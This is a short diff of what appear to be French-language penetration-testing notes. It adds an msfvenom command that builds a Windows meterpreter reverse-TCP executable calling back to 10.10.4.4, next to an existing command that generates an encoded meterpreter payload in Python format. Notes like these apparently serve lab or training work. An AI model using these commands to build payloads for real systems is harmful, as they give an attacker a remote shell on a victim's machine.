@@ -233,3 +233,6 @@ exemple(remplacer votre ip) :
 msfvenom
 -p windows/meterpreter/reverse_tcp lhost=10.10.4.4 lport=4444 -e x86/shikata_ga_nai -b "\x00" -f python
 ````
+````bash
+msfvenom -p windows/meterpreter/reverse_tcp --platform windows --arch x86 -f exe lhost=10.10.4.4 lport=8000 -o /root/Bureau/...
+````
